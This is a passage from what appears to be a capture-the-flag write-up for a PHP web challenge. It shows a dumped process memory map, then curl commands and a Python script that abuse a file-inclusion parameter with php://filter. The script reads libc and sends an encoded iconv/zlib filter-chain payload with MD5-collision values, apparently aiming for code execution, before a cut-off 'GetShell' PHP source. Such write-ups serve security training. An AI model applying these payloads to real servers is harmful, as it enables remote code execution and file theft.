00:39 2659074                    /usr/lib/x86_64-linux-gnu/libargon2.so.17fce63473000-7fce63475000 r--p 00000000 00:39 2658278                    /usr/lib/apache2/modules/mod_negotiation.so7fce63475000-7fce6347a000 r-xp 00002000 00:39 2658278                    /usr/lib/apache2/modules/mod_negotiation.so7fce6347a000-7fce6347b000 r--p 00007000 00:39 2658278                    /usr/lib/apache2/modules/mod_negotiation.so7fce6347b000-7fce6347c000 ---p 00008000 00:39 2658278                    /usr/lib/apache2/modules/mod_negotiation.so7fce6347c000-7fce6347d000 r--p 00008000 00:39 2658278                    /usr/lib/apache2/modules/mod_negotiation.so7fce6347d000-7fce6347e000 rw-p 00009000 00:39 2658278                    /usr/lib/apache2/modules/mod_negotiation.so7fce6347e000-7fce63480000 rw-p 00000000 00:00 07fce63481000-7fce63484000 r--p 00000000 00:39 2658276                    /usr/lib/apache2/modules/mod_mpm_prefork.so7fce63484000-7fce63487000 r-xp 00003000 00:39 2658276                    /usr/lib/apache2/modules/mod_mpm_prefork.so7fce63487000-7fce63489000 r--p 00006000 00:39 2658276                    /usr/lib/apache2/modules/mod_mpm_prefork.so7fce63489000-7fce6348a000 r--p 00007000 00:39 2658276                    /usr/lib/apache2/modules/mod_mpm_prefork.so7fce6348a000-7fce6348b000 rw-p 00008000 00:39 2658276                    /usr/lib/apache2/modules/mod_mpm_prefork.so7fce6348b000-7fce6348d000 rw-p 00000000 00:00 07fce6348d000-7fce6348f000 rw-p 00000000 00:00 07fce6348f000-7fce63491000 r--p 00000000 00:39 2658273                    /usr/lib/apache2/modules/mod_mime.so7fce63491000-7fce63493000 r-xp 00002000 00:39 2658273                    /usr/lib/apache2/modules/mod_mime.so7fce63493000-7fce63494000 r--p 00004000 00:39 2658273                    /usr/lib/apache2/modules/mod_mime.so7fce63494000-7fce63495000 ---p 00005000 00:39 2658273                    /usr/lib/apache2/modules/mod_mime.so7fce63495000-7fce63496000 r--p 00005000 00:39 2658273                    /usr/lib/apache2/modules/mod_mime.so7fce63496000-7fce63497000 rw-p 00006000 00:39 2658273                    /usr/lib/apache2/modules/mod_mime.so7fce63497000-7fce6349b000 rw-p 00000000 00:00 07fce6349b000-7fce6349d000 rw-p 00000000 00:00 07fce6349d000-7fce6349e000 r--p 00000000 00:39 2658254                    /usr/lib/apache2/modules/mod_filter.so7fce6349e000-7fce634a0000 r-xp 00001000 00:39 2658254                    /usr/lib/apache2/modules/mod_filter.so7fce634a0000-7fce634a1000 r--p 00003000 00:39 2658254                    /usr/lib/apache2/modules/mod_filter.so7fce634a1000-7fce634a2000 r--p 00003000 00:39 2658254                    /usr/lib/apache2/modules/mod_filter.so7fce634a2000-7fce634a3000 rw-p 00004000 00:39 2658254                    /usr/lib/apache2/modules/mod_filter.so7fce634a3000-7fce634a5000 rw-p 00000000 00:00 07fce634a6000-7fce634a7000 r--p 00000000 00:39 2658250                    /usr/lib/apache2/modules/mod_env.so7fce634a7000-7fce634a8000 r-xp 00001000 00:39 2658250                    /usr/lib/apache2/modules/mod_env.so7fce634a8000-7fce634a9000 r--p 00002000 00:39 2658250                    /usr/lib/apache2/modules/mod_env.so7fce634a9000-7fce634aa000 r--p 00002000 00:39 2658250                    /usr/lib/apache2/modules/mod_env.so7fce634aa000-7fce634ab000 rw-p 00003000 00:39 2658250                    /usr/lib/apache2/modules/mod_env.so7fce634ab000-7fce634ad000 rw-p 00000000 00:00 07fce634ae000-7fce634af000 r--p 00000000 00:39 2658247                    /usr/lib/apache2/modules/mod_dir.so7fce634af000-7fce634b0000 r-xp 00001000 00:39 2658247                    /usr/lib/apache2/modules/mod_dir.so7fce634b0000-7fce634b1000 r--p 00002000 00:39 2658247                    /usr/lib/apache2/modules/mod_dir.so7fce634b1000-7fce634b2000 r--p 00002000 00:39 2658247                    /usr/lib/apache2/modules/mod_dir.so7fce634b2000-7fce634b3000 rw-p 00003000 00:39 2658247                    /usr/lib/apache2/modules/mod_dir.so7fce634b3000-7fce634b6000 r--p 00000000 00:39 2650576                    /lib/x86_64-linux-gnu/libz.so.1.2.117fce634b6000-7fce634c7000 r-xp 00003000 00:39 2650576                    /lib/x86_64-linux-gnu/libz.so.1.2.117fce634c7000-7fce634cd000 r--p 00014000 00:39 2650576                    /lib/x86_64-linux-gnu/libz.so.1.2.117fce634cd000-7fce634ce000 ---p 0001a000 00:39 2650576                    /lib/x86_64-linux-gnu/libz.so.1.2.117fce634ce000-7fce634cf000 r--p 0001a000 00:39 2650576                    /lib/x86_64-linux-gnu/libz.so.1.2.117fce634cf000-7fce634d0000 rw-p 0001b000 00:39 2650576                    /lib/x86_64-linux-gnu/libz.so.1.2.117fce634d0000-7fce634d4000 rw-p 00000000 00:00 07fce634d4000-7fce634d8000 rw-p 00000000 00:00 07fce634d8000-7fce634da000 r--p 00000000 00:39 2658245                    /usr/lib/apache2/modules/mod_deflate.so7fce634da000-7fce634df000 r-xp 00002000 00:39 2658245                    /usr/lib/apache2/modules/mod_deflate.so7fce634df000-7fce634e1000 r--p 00007000 00:39 2658245                    /usr/lib/apache2/modules/mod_deflate.so7fce634e1000-7fce634e2000 r--p 00008000 00:39 2658245                    /usr/lib/apache2/modules/mod_deflate.so7fce634e2000-7fce634e3000 rw-p 00009000 00:39 2658245                    /usr/lib/apache2/modules/mod_deflate.so7fce634e3000-7fce634e5000 rw-p 00000000 00:00 07fce634e5000-7fce634e7000 r--p 00000000 00:39 2658227                    /usr/lib/apache2/modules/mod_autoindex.so7fce634e7000-7fce634ec000 r-xp 00002000 00:39 2658227                    /usr/lib/apache2/modules/mod_autoindex.so7fce634ec000-7fce634ee000 r--p 00007000 00:39 2658227                    /usr/lib/apache2/modules/mod_autoindex.so7fce634ee000-7fce634ef000 r--p 00008000 00:39 2658227                    /usr/lib/apache2/modules/mod_autoindex.so7fce634ef000-7fce634f0000 rw-p 00009000 00:39 2658227                    /usr/lib/apache2/modules/mod_autoindex.so7fce634f0000-7fce634f2000 rw-p 00000000 00:00 07fce634f2000-7fce634f3000 r--p 00000000 00:39 2658226                    /usr/lib/apache2/modules/mod_authz_user.so7fce634f3000-7fce634f4000 r-xp 00001000 00:39 2658226                    /usr/lib/apache2/modules/mod_authz_user.so7fce634f4000-7fce634f5000 r--p 00002000 00:39 2658226                    /usr/lib/apache2/modules/mod_authz_user.so7fce634f5000-7fce634f6000 r--p 00002000 00:39 2658226                    /usr/lib/apache2/modules/mod_authz_user.so7fce634f6000-7fce634f7000 rw-p 00003000 00:39 2658226                    /usr/lib/apache2/modules/mod_authz_user.so7fce634f7000-7fce634f9000 rw-p 00000000 00:00 07fce634f9000-7fce634fa000 r--p 00000000 00:39 2658224                    /usr/lib/apache2/modules/mod_authz_host.so7fce634fa000-7fce634fb000 r-xp 00001000 00:39 2658224                    /usr/lib/apache2/modules/mod_authz_host.so7fce634fb000-7fce634fc000 r--p 00002000 00:39 2658224                    /usr/lib/apache2/modules/mod_authz_host.so7fce634fc000-7fce634fd000 r--p 00002000 00:39 2658224                    /usr/lib/apache2/modules/mod_authz_host.so7fce634fd000-7fce634fe000 rw-p 00003000 00:39 2658224                    /usr/lib/apache2/modules/mod_authz_host.so7fce634fe000-7fce63500000 rw-p 00000000 00:00 07fce63500000-7fce63502000 r--p 00000000 00:39 2658220                    /usr/lib/apache2/modules/mod_authz_core.so7fce63502000-7fce63504000 r-xp 00002000 00:39 2658220                    /usr/lib/apache2/modules/mod_authz_core.so7fce63504000-7fce63506000 r--p 00004000 00:39 2658220                    /usr/lib/apache2/modules/mod_authz_core.so7fce63506000-7fce63507000 r--p 00005000 00:39 2658220                    /usr/lib/apache2/modules/mod_authz_core.so7fce63507000-7fce63508000 rw-p 00006000 00:39 2658220                    /usr/lib/apache2/modules/mod_authz_core.so7fce63508000-7fce6350a000 rw-p 00000000 00:00 07fce6350a000-7fce6350b000 r--p 00000000 00:39 2658216                    /usr/lib/apache2/modules/mod_authn_file.so7fce6350b000-7fce6350c000 r-xp 00001000 00:39 2658216                    /usr/lib/apache2/modules/mod_authn_file.so7fce6350c000-7fce6350d000 r--p 00002000 00:39 2658216                    /usr/lib/apache2/modules/mod_authn_file.so7fce6350d000-7fce6350e000 r--p 00002000 00:39 2658216                    /usr/lib/apache2/modules/mod_authn_file.so7fce6350e000-7fce6350f000 rw-p 00003000 00:39 2658216                    /usr/lib/apache2/modules/mod_authn_file.so7fce6350f000-7fce63511000 rw-p 00000000 00:00 07fce63511000-7fce63512000 r--p 00000000 00:39 2658213                    /usr/lib/apache2/modules/mod_authn_core.so7fce63512000-7fce63513000 r-xp 00001000 00:39 2658213                    /usr/lib/apache2/modules/mod_authn_core.so7fce63513000-7fce63514000 r--p 00002000 00:39 2658213                    /usr/lib/apache2/modules/mod_authn_core.so7fce63514000-7fce63515000 r--p 00002000 00:39 2658213                    /usr/lib/apache2/modules/mod_authn_core.so7fce63515000-7fce63516000 rw-p 00003000 00:39 2658213                    /usr/lib/apache2/modules/mod_authn_core.so7fce63516000-7fce63518000 rw-p 00000000 00:00 07fce63518000-7fce63519000 r--p 00000000 00:39 2658209                    /usr/lib/apache2/modules/mod_auth_basic.so7fce63519000-7fce6351b000 r-xp 00001000 00:39 2658209                    /usr/lib/apache2/modules/mod_auth_basic.so7fce6351b000-7fce6351c000 r--p 00003000 00:39 2658209                    /usr/lib/apache2/modules/mod_auth_basic.so7fce6351c000-7fce6351d000 r--p 00003000 00:39 2658209                    /usr/lib/apache2/modules/mod_auth_basic.so7fce6351d000-7fce6351e000 rw-p 00004000 00:39 2658209                    /usr/lib/apache2/modules/mod_auth_basic.so7fce6351e000-7fce63520000 rw-p 00000000 00:00 07fce63520000-7fce63521000 r--p 00000000 00:39 2658206                    /usr/lib/apache2/modules/mod_alias.so7fce63521000-7fce63523000 r-xp 00001000 00:39 2658206                    /usr/lib/apache2/modules/mod_alias.so7fce63523000-7fce63524000 r--p 00003000 00:39 2658206                    /usr/lib/apache2/modules/mod_alias.so7fce63524000-7fce63525000 r--p 00003000 00:39 2658206                    /usr/lib/apache2/modules/mod_alias.so7fce63525000-7fce63526000 rw-p 00004000 00:39 2658206                    /usr/lib/apache2/modules/mod_alias.so7fce63526000-7fce63528000 rw-p 00000000 00:00 07fce63528000-7fce63529000 r--p 00000000 00:39 2658204                    /usr/lib/apache2/modules/mod_access_compat.so7fce63529000-7fce6352a000 r-xp 00001000 00:39 2658204                    /usr/lib/apache2/modules/mod_access_compat.so7fce6352a000-7fce6352b000 r--p 00002000 00:39 2658204                    /usr/lib/apache2/modules/mod_access_compat.so7fce6352b000-7fce6352c000 r--p 00002000 00:39 2658204                    /usr/lib/apache2/modules/mod_access_compat.so7fce6352c000-7fce6352d000 rw-p 00003000 00:39 2658204                    /usr/lib/apache2/modules/mod_access_compat.so7fce6352d000-7fce63569000 rw-p 00000000 00:00 07fce63569000-7fce6356a000 r--p 00000000 00:39 2650520                    /lib/x86_64-linux-gnu/libdl-2.31.so7fce6356a000-7fce6356c000 r-xp 00001000 00:39 2650520                    /lib/x86_64-linux-gnu/libdl-2.31.so7fce6356c000-7fce6356d000 r--p 00003000 00:39 2650520                    /lib/x86_64-linux-gnu/libdl-2.31.so7fce6356d000-7fce6356e000 r--p 00003000 00:39 2650520                    /lib/x86_64-linux-gnu/libdl-2.31.so7fce6356e000-7fce6356f000 rw-p 00004000 00:39 2650520                    /lib/x86_64-linux-gnu/libdl-2.31.so7fce6356f000-7fce63571000 r--p 00000000 00:39 2651300                    /usr/lib/x86_64-linux-gnu/libuuid.so.1.3.07fce63571000-7fce63575000 r-xp 00002000 00:39 2651300                    /usr/lib/x86_64-linux-gnu/libuuid.so.1.3.07fce63575000-7fce63576000 r--p 00006000 00:39 2651300                    /usr/lib/x86_64-linux-gnu/libuuid.so.1.3.07fce63576000-7fce63577000 r--p 00006000 00:39 2651300                    /usr/lib/x86_64-linux-gnu/libuuid.so.1.3.07fce63577000-7fce63578000 rw-p 00007000 00:39 2651300                    /usr/lib/x86_64-linux-gnu/libuuid.so.1.3.07fce63578000-7fce6357c000 r--p 00000000 00:39 2658154                    /lib/x86_64-linux-gnu/libexpat.so.1.6.127fce6357c000-7fce63599000 r-xp 00004000 00:39 2658154                    /lib/x86_64-linux-gnu/libexpat.so.1.6.127fce63599000-7fce635a3000 r--p 00021000 00:39 2658154                    /lib/x86_64-linux-gnu/libexpat.so.1.6.127fce635a3000-7fce635a4000 ---p 0002b000 00:39 2658154                    /lib/x86_64-linux-gnu/libexpat.so.1.6.127fce635a4000-7fce635a6000 r--p 0002b000 00:39 2658154                    /lib/x86_64-linux-gnu/libexpat.so.1.6.127fce635a6000-7fce635a7000 rw-p 0002d000 00:39 2658154                    /lib/x86_64-linux-gnu/libexpat.so.1.6.127fce635a7000-7fce635a9000 rw-p 00000000 00:00 07fce635a9000-7fce635ab000 r--p 00000000 00:39 2650519                    /lib/x86_64-linux-gnu/libcrypt.so.1.1.07fce635ab000-7fce635c0000 r-xp 00002000 00:39 2650519                    /lib/x86_64-linux-gnu/libcrypt.so.1.1.07fce635c0000-7fce635da000 r--p 00017000 00:39 2650519                    /lib/x86_64-linux-gnu/libcrypt.so.1.1.07fce635da000-7fce635db000 r--p 00030000 00:39 2650519                    /lib/x86_64-linux-gnu/libcrypt.so.1.1.07fce635db000-7fce635dc000 rw-p 00031000 00:39 2650519                    /lib/x86_64-linux-gnu/libcrypt.so.1.1.07fce635dc000-7fce635e4000 rw-p 00000000 00:00 07fce635e4000-7fce63609000 r--p 00000000 00:39 2650512                    /lib/x86_64-linux-gnu/libc-2.31.so7fce63609000-7fce63754000 r-xp 00025000 00:39 2650512                    /lib/x86_64-linux-gnu/libc-2.31.so7fce63754000-7fce6379e000 r--p 00170000 00:39 2650512                    /lib/x86_64-linux-gnu/libc-2.31.so7fce6379e000-7fce6379f000 ---p 001ba000 00:39 2650512                    /lib/x86_64-linux-gnu/libc-2.31.so7fce6379f000-7fce637a2000 r--p 001ba000 00:39 2650512                    /lib/x86_64-linux-gnu/libc-2.31.so7fce637a2000-7fce637a5000 rw-p 001bd000 00:39 2650512                    /lib/x86_64-linux-gnu/libc-2.31.so7fce637a5000-7fce637a9000 rw-p 00000000 00:00 07fce637a9000-7fce637b0000 r--p 00000000 00:39 2650557                    /lib/x86_64-linux-gnu/libpthread-2.31.so7fce637b0000-7fce637c0000 r-xp 00007000 00:39 2650557                    /lib/x86_64-linux-gnu/libpthread-2.31.so7fce637c0000-7fce637c5000 r--p 00017000 00:39 2650557                    /lib/x86_64-linux-gnu/libpthread-2.31.so7fce637c5000-7fce637c6000 r--p 0001b000 00:39 2650557                    /lib/x86_64-linux-gnu/libpthread-2.31.so7fce637c6000-7fce637c7000 rw-p 0001c000 00:39 2650557                    /lib/x86_64-linux-gnu/libpthread-2.31.so7fce637c7000-7fce637cb000 rw-p 00000000 00:00 07fce637cb000-7fce637d8000 r--p 00000000 00:39 2658343                    /usr/lib/x86_64-linux-gnu/libapr-1.so.0.7.07fce637d8000-7fce637fa000 r-xp 0000d000 00:39 2658343                    /usr/lib/x86_64-linux-gnu/libapr-1.so.0.7.07fce637fa000-7fce63805000 r--p 0002f000 00:39 2658343                    /usr/lib/x86_64-linux-gnu/libapr-1.so.0.7.07fce63805000-7fce63806000 ---p 0003a000 00:39 2658343                    /usr/lib/x86_64-linux-gnu/libapr-1.so.0.7.07fce63806000-7fce63807000 r--p 0003a000 00:39 2658343                    /usr/lib/x86_64-linux-gnu/libapr-1.so.0.7.07fce63807000-7fce63808000 rw-p 0003b000 00:39 2658343                    /usr/lib/x86_64-linux-gnu/libapr-1.so.0.7.07fce63808000-7fce63811000 r--p 00000000 00:39 2658345                    /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0.6.17fce63811000-7fce6382b000 r-xp 00009000 00:39 2658345                    /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0.6.17fce6382b000-7fce63834000 r--p 00023000 00:39 2658345                    /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0.6.17fce63834000-7fce63835000 r--p 0002b000 00:39 2658345                    /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0.6.17fce63835000-7fce63836000 rw-p 0002c000 00:39 2658345                    /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0.6.17fce63836000-7fce63838000 r--p 00000000 00:39 2650556                    /lib/x86_64-linux-gnu/libpcre.so.3.13.37fce63838000-7fce63889000 r-xp 00002000 00:39 2650556                    /lib/x86_64-linux-gnu/libpcre.so.3.13.37fce63889000-7fce638a7000 r--p 00053000 00:39 2650556                    /lib/x86_64-linux-gnu/libpcre.so.3.13.37fce638a7000-7fce638a8000 r--p 00070000 00:39 2650556                    /lib/x86_64-linux-gnu/libpcre.so.3.13.37fce638a8000-7fce638a9000 rw-p 00071000 00:39 2650556                    /lib/x86_64-linux-gnu/libpcre.so.3.13.37fce638a9000-7fce638ad000 rw-p 00000000 00:00 07fce638ad000-7fce638af000 rw-p 00000000 00:00 07fce638af000-7fce638b0000 r--p 00000000 00:39 2650500                    /lib/x86_64-linux-gnu/ld-2.31.so7fce638b0000-7fce638d0000 r-xp 00001000 00:39 2650500                    /lib/x86_64-linux-gnu/ld-2.31.so7fce638d0000-7fce638d8000 r--p 00021000 00:39 2650500                    /lib/x86_64-linux-gnu/ld-2.31.so7fce638d9000-7fce638da000 r--p 00029000 00:39 2650500                    /lib/x86_64-linux-gnu/ld-2.31.so7fce638da000-7fce638db000 rw-p 0002a000 00:39 2650500                    /lib/x86_64-linux-gnu/ld-2.31.so7fce638db000-7fce638dc000 rw-p 00000000 00:00 07ffc163ff000-7ffc16420000 rw-p 00000000 00:00 0                          [stack]7ffc1656a000-7ffc1656e000 r--p 00000000 00:00 0                          [vvar]7ffc1656e000-7ffc16570000 r-xp 00000000 00:00 0                          [vdso]ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]#/lib/x86_64-linux-gnu/libc-2.31.so........here<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">curl -X POST http://node1.anna.nssctf.cn:28468/?file=php://filter/read=convert.base64-encode/resource=/lib/x86_64-linux-gnu/libc-2.31.so -d "a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">curl -X POST http://node1.anna.nssctf.cn:28468/?file=php://filter/read=zlib.inflate|zlib.inflate|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.UTF-8.ISO-2022-CN-EXT|convert.quoted-printable-decode|convert.iconv.latin1.latin1/resource=data:text/plain;base64,e3vXt%2b/NNlG2gL73WSu0QrdmLXC8806umlMwJ0t6ZsqUo6m8M1Pkd4rEC9yQY81grntgqbBPO2zz1%2bDpK1ZmsTLgBQlcp4uOhOaFr0wOy994PeqZ2Ek2Rvw6ZhzZJFM49XboqxlXo99snbbTdZMjfg0Maht13GOelk21SvsqVr02NW9ijgABK07V3nyk9VWr9EzW2/yG94/D9svW/Pxxetv11P8rfm9%2b917%2b9%2b3n8qULPY9VLX3/udtNxZ6fgAv%2b3LTN/vLphpvk5tLuv5vfyZfW231/Xlv//8Z9u%2b9Rvyuu2NXeq/v9c9rr%2bP3x8ie38%2bA37P/03/rXuU%2b83x%2bjr7D/v02a/fUb99/9/lxbb/erYvXvte%2b%2bp%2b7/f4F/nv2b89e/Xv9ut/fvjvvx1w/euh80L7n27etf94/2/0v79Hybvf160/zff2v3138rftb%2b%2bEzl2u3Xp77e%2bu/4322x6b/vXN9eW/um3%2bbc5rvr/ketm/rdrvbJqevbuZ9avpf/%2b%2bfvj8e7wuKeVq7dH3s8/76b3Hfv9X%2bd/gra1dfe6v9/N9q0532Ry6fPbPj9YdCbCgvlXqPN9f8fv5%2bYQygg2z539Jgu3ioXPcXT5VL9qOJRxaOK6ay44aXu1mM%2b/bt7ltf2bnLpTJEmYLZP/krTtKo7qTZvs6eoeqncJqA8ocp7reHlx3qPM%2bMX6wQq3SRQiDBcjnolFr7yo%2b3db8r55qem/1j55/X6/3%2biNQUTrQk5LHtldMzSY99LbvdLPe12bXlLQL3B2qV5hVOl7l/Otc%2baoi8m%2bJ8RAA== -d "a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*- #</span><span class="token triple-quoted-string string">"""@filename:post.py@auther:JunLeon@time:2025--23"""</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://node1.anna.nssctf.cn:28468/"</span>params <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"file"</span><span class="token punctuation">:</span> <span class="token string">"php://filter/read=zlib.inflate|zlib.inflate|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.UTF-8.ISO-2022-CN-EXT|convert.quoted-printable-decode|convert.iconv.latin1.latin1/resource=data:text/plain;base64,e3vXt%2b/NNlG2gL73WSu0QrdmLXC8806umlMwJ0t6ZsqUo6m8M1Pkd4rEC9yQY81grntgqbBPO2zz1%2bDpK1ZmsTLgBQlcp4uOhOaFr0wOy994PeqZ2Ek2Rvw6ZhzZJFM49XboqxlXo99snbbTdZMjfg0Maht13GOelk21SvsqVr02NW9ijgABK07V3nyk9VWr9EzW2/yG94/D9svW/Pxxetv11P8rfm9%2b917%2b9%2b3n8qULPY9VLX3/udtNxZ6fgAv%2b3LTN/vLphpvk5tLuv5vfyZfW231/Xlv//8Z9u%2b9Rvyuu2NXeq/v9c9rr%2bP3x8ie38%2bA37P/03/rXuU%2b83x%2bjr7D/v02a/fUb99/9/lxbb/erYvXvte%2b%2bp%2b7/f4F/nv2b89e/Xv9ut/fvjvvx1w/euh80L7n27etf94/2/0v79Hybvf160/zff2v3138rftb%2b%2bEzl2u3Xp77e%2bu/4322x6b/vXN9eW/um3%2bbc5rvr/ketm/rdrvbJqevbuZ9avpf/%2b%2bfvj8e7wuKeVq7dH3s8/76b3Hfv9X%2bd/gra1dfe6v9/N9q0532Ry6fPbPj9YdCbCgvlXqPN9f8fv5%2bYQygg2z539Jgu3ioXPcXT5VL9qOJRxaOK6ay44aXu1mM%2b/bt7ltf2bnLpTJEmYLZP/krTtKo7qTZvs6eoeqncJqA8ocp7reHlx3qPM%2bMX6wQq3SRQiDBcjnolFr7yo%2b3db8r55qem/1j55/X6/3%2biNQUTrQk5LHtldMzSY99LbvdLPe12bXlLQL3B2qV5hVOl7l/Otc%2baoi8m%2bJ8RAA=="</span><span class="token punctuation">}</span>data <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"a"</span><span class="token punctuation">:</span> <span class="token string">"TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak"</span><span class="token punctuation">,</span>  <span class="token string">"b"</span><span class="token punctuation">:</span> <span class="token string">"TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak"</span><span class="token punctuation">}</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt; ?phphighlight_file(__FILE__);class ConfigLoader {    private $config;    public function __construct() {        $this-&gt;config = [            'debug' =&gt; true,            'mode' =&gt; 'production',            'log_level' =&gt; 'info',            'max_input_length' =&gt; 100,            'min_password_length' =&gt; 8,            'allowed_actions' =&gt; ['run', 'debug', 'generate']        ];    }    public function get($key) {        return $this-&gt;config[$key] ?? null;    }}class Logger {    private $logLevel;    public function __construct($logLevel) {        $this-&gt;logLevel = $logLevel;    }    public function log($message, $level = 'info') {        if ($level === $this-&gt;logLevel) {            echo "[LOG] $message\n";        }    }}class UserManager {    private $users = [];    private $logger;    public function __construct($logger) {        $this-&gt;logger = $logger;    }    public function addUser($username, $password) {        if (strlen($username) &lt; 5) {            return "Username must be at least 5 characters";        }        if (strlen($password) &lt; 8) {            return "Password must be at least 8 characters";        }        $this-&gt;users[$username] = password_hash($password, PASSWORD_BCRYPT);        $this-&gt;logger-&gt;log("User $username added");        return "User $username added";    }    public function authenticate($username, $password) {        if (isset($this-&gt;users[$username]) 